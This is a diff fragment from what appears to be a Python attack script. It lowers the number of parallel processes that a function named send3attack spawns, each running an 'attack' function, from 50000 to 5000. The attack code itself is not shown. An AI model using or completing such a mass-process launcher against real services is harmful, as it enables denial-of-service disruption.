@@ -51,7 +51,7 @@ sleep(1)
 
 
 def send3attack():
-  for i in range(50000): #Poder Mágico
+  for i in range(5000): #Poder Mágico
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
